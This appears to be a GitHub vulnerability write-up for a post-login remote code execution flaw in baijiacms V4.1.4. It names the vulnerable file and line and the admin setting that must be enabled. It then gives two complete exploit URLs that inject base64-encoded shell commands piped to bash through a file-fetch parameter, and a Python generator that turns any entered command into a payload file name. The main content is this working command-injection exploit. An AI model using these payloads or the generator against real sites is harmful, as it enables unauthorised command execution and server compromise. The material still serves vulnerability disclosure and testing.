# baijiacms-RCE
baijiacms background RCE


The address of the project: https://github.com/baijiacms/baijiacmsV4

Version: V4.1.4 20170105 FINAL

Environment:
+ php 5.5.38
+ nginx 1.15
+ mysql 5.7.27
+ 20.04.1 - Ubuntu



Leak point in  includes/baijiacms/common.inc.php
Line 654.

![图片](https://user-images.githubusercontent.com/51741690/202916918-cb2b4576-d20b-4033-9fd4-da7cf3e4bff9.png)



# Use it
The system is designed to compress images. Therefore, to take advantage of this vulnerability, you need to log in to the background first and set the image compression ratio in "Attachment Settings", otherwise the code cannot run here.

![图片](https://user-images.githubusercontent.com/51741690/202916939-4b14710d-5528-4b78-89a1-6afdb18de143.png)



EXP1：http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&act=public&do=file&op=fetch&url=http://127.0.0.1/poc.;echo${IFS}cGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==|base64${IFS}-d|bash;&status=1&beid=1
![图片](https://user-images.githubusercontent.com/51741690/202916957-60d79a4a-f01e-4e89-9a6c-4d9e13c733eb.png)




EXP2：http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&act=public&do=file&op=fetch&url=http://127.0.0.1/whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;&status=1&beid=1
![图片](https://user-images.githubusercontent.com/51741690/202916979-b8c559ac-a262-4d58-9494-1341d12b3d80.png)



The poc can be generated using the following code, and then open the web service to ensure that the file is accessible.

```python
import base64

webpath = "/home/ubuntu/test/"
print("exr6mq.ceye.io")
cmd = input("cmd>>> ") or "ping php2.exr6mq.ceye.io"


b64cmd = base64.b64encode(cmd.encode()).decode()

payload = f"echo {b64cmd}|base64 -d|bash"

print(payload)
payload = payload.replace(' ','${IFS}')
print(payload)

name = input("name>>>")
payload = f"{name}.;{payload};"
print(payload)

with open(file=webpath+payload,mode='w')as f:
    f.write('1')

```
